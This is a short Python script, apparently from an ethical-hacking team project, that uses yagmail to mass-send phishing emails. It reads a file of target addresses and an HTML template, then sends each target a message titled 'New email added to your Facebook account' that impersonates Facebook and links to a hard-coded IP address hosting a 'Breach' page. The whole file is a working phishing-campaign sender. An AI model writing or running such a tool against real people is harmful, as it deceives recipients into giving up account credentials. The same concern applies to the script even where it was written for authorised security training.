import yagmail
import datetime
import sys
'''
USAGE:
python emailer.py <emails-to-phish.txt> <phishing-email.html>
'''

# first is "from" arg; using a dictionary you can give an alias as value
#yag=yagmail.SMTP({fromreal:'fakealias'}, 'password') 
#could add a .yagmail file to keep this hidden for security sake
#yag = yagmail.SMTP('''FILL THIS OUT WITH YOUR USER/PASS FOR YOUR EMAIL SERVICE''')
#yag = yagmail.SMTP('<USER>', '<PASS>')


#load email from HTML file
'''TODO:
make sure email picture is from the user email fb acct.
make sure user name is correct ($USER -> fb profile name)
move subject line to a new file maybe?
'''
with open(sys.argv[1], 'r') as emails:
    #give the targeted email addresses a nice 'ol slap
    email_list = emails.read().splitlines()

    print("Phishing emails sent to:")
    for email in email_list:
        with open(sys.argv[2], 'r') as f:
            data = f.read().replace('\n', '')
            data = data.replace('$EMAIL', 'plznohack420@gmail.com')
            data = data.replace('$USEREMAIL', email)
            data = data.replace(' $USER', '')
            data = data.replace('$LINK', 'http://13.57.61.57/EthicalHackingTeam2/Breach/')

            formattedDate = datetime.date.strftime(datetime.datetime.utcnow(), '%A, %B %d, %Y at %H:%M (UTC)')
            data = data.replace('$DATE', formattedDate)

            contents = [data]
            subject = 'New email added to your Facebook account'
            yag.send(email, subject, contents)

        print('\t' + email)
